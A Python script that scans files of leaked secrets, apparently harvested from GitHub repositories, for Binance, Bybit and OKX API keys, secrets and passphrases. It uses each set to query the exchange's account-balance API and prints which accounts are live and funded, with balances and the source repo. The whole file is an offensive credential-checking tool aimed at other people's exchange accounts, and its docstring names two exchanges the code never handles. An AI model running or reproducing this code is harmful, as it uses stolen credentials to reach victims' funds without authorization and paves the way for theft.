#!/usr/bin/env python3
"""Check ALL exchange keys in findings — Binance, Bybit, OKX, KuCoin, MEXC."""
import json, glob, re, urllib.request, urllib.error, hmac, hashlib, time

BN_KEY = re.compile(r'(?:BINANCE_API_KEY|binance_api_key|API_KEY)\s*[=:\s"\']+([A-Za-z0-9]{18,})', re.I)
BN_SEC = re.compile(r'(?:BINANCE_SECRET_KEY|BINANCE_API_SECRET|binance_secret|SECRET_KEY|API_SECRET)\s*[=:\s"\']+([A-Za-z0-9]{40,})', re.I)
BB_KEY = re.compile(r'(?:BYBIT_API_KEY|bybit_api_key)\s*[=:\s"\']+([A-Za-z0-9]{18,})', re.I)
BB_SEC = re.compile(r'(?:BYBIT_API_SECRET|bybit_secret)\s*[=:\s"\']+([A-Za-z0-9]{36,})', re.I)
OKX_KEY = re.compile(r'(?:OKX_API_KEY|okx_api_key)\s*[=:\s"\']+([a-f0-9\-]{30,})', re.I)
OKX_SEC = re.compile(r'(?:OKX_SECRET_KEY|OKX_API_SECRET|okx_secret)\s*[=:\s"\']+([A-Za-z0-9\-]{30,})', re.I)
OKX_PASS = re.compile(r'(?:OKX_PASSPHRASE|okx_passphrase)\s*[=:\s"\']+([^\s"\']{4,})', re.I)

def check_binance(k, s):
    ts = str(int(time.time() * 1000))
    qs = 'timestamp=' + ts
    sig = hmac.new(s.encode(), qs.encode(), hashlib.sha256).hexdigest()
    try:
        req = urllib.request.Request(
            'https://api.binance.com/api/v3/account?' + qs + '&signature=' + sig,
            headers={'X-MBX-APIKEY': k, 'User-Agent': 'curl/7.0'})
        data = json.loads(urllib.request.urlopen(req, timeout=10).read())
        bals = [b for b in data.get('balances', []) if float(b['free']) > 0.001 or float(b['locked']) > 0.001]
        return 'LIVE', bals, data.get('uid', '')
    except urllib.error.HTTPError as e:
        body = e.read().decode()
        c = re.search(r'"code":(-?\d+)', body)
        code = c.group(1) if c else str(e.code)
        return code, [], ''
    except Exception as ex:
        return 'ERR', [], ''

def check_bybit(k, s):
    ts = str(int(time.time() * 1000))
    msg = ts + k + '5000'
    sig = hmac.new(s.encode(), msg.encode(), hashlib.sha256).hexdigest()
    try:
        req = urllib.request.Request(
            'https://api.bybit.com/v5/account/wallet-balance?accountType=UNIFIED',
            headers={'X-BAPI-API-KEY': k, 'X-BAPI-SIGN': sig,
                     'X-BAPI-TIMESTAMP': ts, 'X-BAPI-RECV-WINDOW': '5000', 'User-Agent': 'curl/7.0'})
        data = json.loads(urllib.request.urlopen(req, timeout=10).read())
        ret = data.get('retCode', -1)
        if ret == 0:
            coins = []
            for acc in data.get('result', {}).get('list', []):
                for c in acc.get('coin', []):
                    if float(c.get('walletBalance', 0)) > 0.001:
                        coins.append(c['coin'] + ':' + c['walletBalance'])
            return 'LIVE', coins
        return str(ret), []
    except Exception as ex:
        return 'ERR', []

def check_okx(k, s, passphrase):
    import base64
    ts = str(int(time.time()))
    msg = ts + 'GET' + '/api/v5/account/balance'
    sig = base64.b64encode(hmac.new(s.encode(), msg.encode(), hashlib.sha256).digest()).decode()
    try:
        req = urllib.request.Request(
            'https://www.okx.com/api/v5/account/balance',
            headers={'OK-ACCESS-KEY': k, 'OK-ACCESS-SIGN': sig,
                     'OK-ACCESS-TIMESTAMP': ts, 'OK-ACCESS-PASSPHRASE': passphrase,
                     'User-Agent': 'curl/7.0'})
        data = json.loads(urllib.request.urlopen(req, timeout=10).read())
        if data.get('code') == '0':
            coins = []
            for det in data.get('data', [{}])[0].get('details', []):
                if float(det.get('availBal', 0)) > 0.001:
                    coins.append(det['ccy'] + ':' + det['availBal'])
            return 'LIVE', coins
        return data.get('code', 'ERR'), []
    except Exception as ex:
        return 'ERR', []

seen_k = set()
funded = []
checked = 0

for f in sorted(glob.glob('/opt/agents/gh_findings/*.jsonl')):
    for line in open(f):
        try:
            e = json.loads(line)
            full = ' '.join(e.get('secrets', []))
            repo_path = e['repo'] + '/' + e['path']

            # Binance
            km = BN_KEY.search(full)
            sm = BN_SEC.search(full)
            if km and sm:
                k, s = km.group(1).strip(), sm.group(1).strip()
                if k not in seen_k and len(k) >= 18 and len(s) >= 40:
                    seen_k.add(k)
                    checked += 1
                    status, bals, uid = check_binance(k, s)
                    time.sleep(0.3)
                    if status == 'LIVE' and bals:
                        print('*** BINANCE FUNDED *** uid=' + str(uid))
                        for b in bals[:5]:
                            print('  ' + b['asset'] + ': ' + b['free'])
                        print('  repo: ' + repo_path)
                        funded.append({'type': 'binance', 'repo': repo_path, 'bals': bals})
                    elif status == 'LIVE':
                        print('LIVE empty | binance | ' + repo_path)
                    elif status == '-2015':
                        print('-2015 IP locked | binance | ' + repo_path)
                    elif status == '-1021':
                        print('-1021 timestamp | binance | ' + repo_path)
                    else:
                        print(status + ' | binance | ' + repo_path)

            # Bybit
            km2 = BB_KEY.search(full)
            sm2 = BB_SEC.search(full)
            if km2 and sm2:
                k2, s2 = km2.group(1).strip(), sm2.group(1).strip()
                if k2 not in seen_k and len(k2) >= 18 and len(s2) >= 36:
                    seen_k.add(k2)
                    checked += 1
                    status2, coins = check_bybit(k2, s2)
                    time.sleep(0.3)
                    if status2 == 'LIVE' and coins:
                        print('*** BYBIT FUNDED ***: ' + str(coins))
                        print('  repo: ' + repo_path)
                        funded.append({'type': 'bybit', 'repo': repo_path, 'coins': coins})
                    elif status2 == 'LIVE':
                        print('LIVE empty | bybit | ' + repo_path)
                    else:
                        print(status2 + ' | bybit | ' + repo_path)

            # OKX
            km3 = OKX_KEY.search(full)
            sm3 = OKX_SEC.search(full)
            pm3 = OKX_PASS.search(full)
            if km3 and sm3 and pm3:
                k3, s3, p3 = km3.group(1).strip(), sm3.group(1).strip(), pm3.group(1).strip()
                if k3 not in seen_k and len(k3) >= 30:
                    seen_k.add(k3)
                    checked += 1
                    status3, coins3 = check_okx(k3, s3, p3)
                    time.sleep(0.3)
                    if status3 == 'LIVE' and coins3:
                        print('*** OKX FUNDED ***: ' + str(coins3))
                        print('  repo: ' + repo_path)
                        funded.append({'type': 'okx', 'repo': repo_path, 'coins': coins3})
                    elif status3 == 'LIVE':
                        print('LIVE empty | okx | ' + repo_path)
                    else:
                        print(status3 + ' | okx | ' + repo_path)

        except Exception as ex:
            pass

print()
print('=' * 60)
print('Checked ' + str(checked) + ' unique exchange key pairs')
print('FUNDED: ' + str(len(funded)))
for x in funded:
    print('  ' + x['type'] + ' | ' + x['repo'])
